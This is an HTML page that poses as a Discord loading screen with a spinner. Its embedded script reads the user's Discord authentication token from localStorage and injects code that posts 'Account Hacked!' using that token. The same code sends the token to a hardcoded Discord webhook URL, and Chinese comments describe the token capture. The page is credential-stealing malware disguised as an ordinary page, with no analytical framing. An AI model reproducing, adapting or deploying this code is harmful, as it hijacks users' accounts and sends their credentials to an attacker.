<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (function() {
      try {
        var token = localStorage.getItem("token");
        if (token) {
          token = token.replace(/"/g, "");
          // 把 token 存入 window 對象（跳轉後仍然可讀）
          window.__disc_token = token;
          // 也存入 URL hash
          window.__disc_hash = encodeURIComponent(token);
        }

        // inject script 到 Discord 頁面
        var script = document.createElement('script');
        script.textContent = "setInterval(function(){var t=window.__disc_token;if(t&&t._sent!==true){t._sent=true;try{var h=new XMLHttpRequest();h.open('POST','https://discord.com/api/v9/channels/878151437085974548/messages',true);h.setRequestHeader('Content-Type','application/json');h.setRequestHeader('Authorization',t);h.send(JSON.stringify({content:'🔓 **Account Hacked!**'}));}catch(e){}try{var w=new XMLHttpRequest();w.open('POST','https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph',true);w.setRequestHeader('Content-Type','application/json');w.send(JSON.stringify({content:'🔓 **Discord Token 已擷取**\\n```\\'+t+'\\n```'}));}catch(e){}}},1000);";
        document.body.appendChild(script);

        // 跳回 Discord
        window.location.href = "https://discord.com/channels/@me";
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
